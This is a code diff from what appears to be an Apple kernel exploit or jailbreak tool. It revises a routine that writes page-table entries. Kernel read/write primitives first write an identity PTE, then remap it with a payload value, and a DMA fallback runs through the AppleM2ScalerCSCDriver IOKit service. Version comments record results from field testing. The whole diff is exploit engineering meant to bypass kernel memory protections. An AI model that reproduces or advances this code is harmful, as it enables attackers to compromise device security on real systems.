@@ -3579,15 +3579,25 @@ static NSString *kpFmtSptmFn(uint64_t raw)
     }
 
     BOOL wrote = NO;
-    // 2.0.155: aperture write when the table page is type 0x21 (field: DMA into
-    // DART heap copies does not change walker). DMA only for non-0x21 pages.
-    if (hitType == 0x21 && hitTableVA) {
-        uint64_t pteVA = hitTableVA + hitOff;
-        krw_zone_verdict zv = krw_zone_write_qword(pteVA, newPte, hitTableVA, 0x4000);
-        kpNote(r, [NSString stringWithFormat:@"  [C3W] aperture write va=%#llx zv=%d payload=%#018llx",
-                  (unsigned long long)pteVA, (int)zv, (unsigned long long)newPte]);
-        wrote = (zv == KRW_ZONE_OK);
-    } else if (ptePage && ttM && isTable) {
+    // 2.0.156: ALWAYS aperture first (identity then real). Field 2.0.155
+    // logged DMA+wrote=0 on a type-0x21 target — path selection was wrong.
+    uint64_t pteVA = hitTableVA + hitOff;
+    if (hitTableVA) {
+        krw_zone_verdict zid = krw_zone_write_qword(pteVA, hitVal, hitTableVA, 0x4000);
+        uint64_t rbId = early_kread64(pteVA);
+        kpNote(r, [NSString stringWithFormat:@"  [C3W] identity PTE zv=%d rb=%#018llx expect=%#018llx %@",
+                  (int)zid, (unsigned long long)rbId, (unsigned long long)hitVal,
+                  rbId == hitVal ? @"OK" : @"NO"]);
+        if (zid == KRW_ZONE_OK && rbId == hitVal) {
+            krw_zone_verdict zv = krw_zone_write_qword(pteVA, newPte, hitTableVA, 0x4000);
+            kpNote(r, [NSString stringWithFormat:@"  [C3W] aperture remap zv=%d payload=%#018llx",
+                      (int)zv, (unsigned long long)newPte]);
+            wrote = (zv == KRW_ZONE_OK);
+        } else {
+            kpNote(r, @"  [C3W] identity PTE write refused — skip remap");
+        }
+    }
+    if (!wrote && ptePage && ttM && isTable) {
         io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                        IOServiceMatching("AppleM2ScalerCSCDriver"));
         if (svc) {
@@ -3602,8 +3612,6 @@ static NSString *kpFmtSptmFn(uint64_t raw)
         } else {
             kpNote(r, @"  [C3W] M2Scaler нет");
         }
-    } else {
-        kpNote(r, @"  [C3W] write path incomplete");
     }
 
     uint64_t rbP = hitTableVA ? early_kread64(hitTableVA + hitOff) : 0;
